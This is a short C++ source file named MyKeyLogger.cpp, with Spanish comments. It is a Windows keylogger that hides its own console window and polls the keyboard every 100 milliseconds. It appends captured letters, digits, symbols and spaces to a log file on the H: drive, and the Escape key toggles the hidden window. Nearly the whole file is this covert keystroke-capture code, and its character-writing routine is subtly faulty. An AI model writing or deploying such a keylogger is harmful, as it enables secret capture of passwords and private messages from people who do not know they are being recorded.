// MyKeyLogger.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
#include <iostream>
using namespace std;
#include <windows.h>
#include <chrono>
#include <thread>
#include <conio.h>

char simbolos[] = { '1','2','3','4','5','6','7','8','9','0',',' ,'.','-','_',';',':','{','}','[',']','`','+','*','^','´','ç','@','#','&','!','"','$','%','/','(',')','=','?','¿','º','ª',
		'Q','W','E','R','T','Y','U' ,'I','O','P','A','S','D','F','G','H','J','K','L','Ñ','Z','X' ,'C','V','B','N','M' ,
		'q','w','e','r','t','y','u','i','o','p','a','s','d','f' ,'g','h','j','k','l','ñ','z','x','c','v','b','n','m' };

void HideConsole() { ::ShowWindow(::GetConsoleWindow(), SW_HIDE); }
void ShowConsole() { ::ShowWindow(::GetConsoleWindow(), SW_SHOW); }
bool IsConsoleVisible() { return ::IsWindowVisible(::GetConsoleWindow()) != FALSE; }

int WriteChar(char c) {
	FILE* fp = std::fopen("H:/keylog.txt", "a+");
	if (!fp) {std::perror("File opening failed");return EXIT_FAILURE;}
	char* pc= &c;fputs(pc, fp);std::fclose(fp);return 0;
}

int main() {std::cout << "A la espera de pulsaciones\n"; HideConsole();
for (;;) {
	std::this_thread::sleep_for(std::chrono::milliseconds(100));
	if (GetAsyncKeyState(VK_ESCAPE)) { if (IsConsoleVisible()) { HideConsole(); } else { ShowConsole(); }; }
	if (GetAsyncKeyState(VK_SPACE)) { cout << ' '; WriteChar(' '); }
	for (int c = 0; c < sizeof(simbolos); c++) { if (GetAsyncKeyState(simbolos[c])) { cout << simbolos[c]; WriteChar(simbolos[c]); } }
	//	if (_kbhit() != 0) {char c = (char)_getch();cout  << c ; WriteChar(c);}
}
};
// Ejecutar programa: Ctrl + F5 o menú Depurar > Iniciar sin depurar
// Depurar programa: F5 o menú Depurar > Iniciar depuración

// Sugerencias para primeros pasos: 1. Use la ventana del Explorador de soluciones para agregar y administrar archivos
//   2. Use la ventana de Team Explorer para conectar con el control de código fuente
//   3. Use la ventana de salida para ver la salida de compilación y otros mensajes
//   4. Use la ventana Lista de errores para ver los errores
//   5. Vaya a Proyecto > Agregar nuevo elemento para crear nuevos archivos de código, o a Proyecto > Agregar elemento existente para agregar archivos de código existentes al proyecto
//   6. En el futuro, para volver a abrir este proyecto, vaya a Archivo > Abrir > Proyecto y seleccione el archivo .sln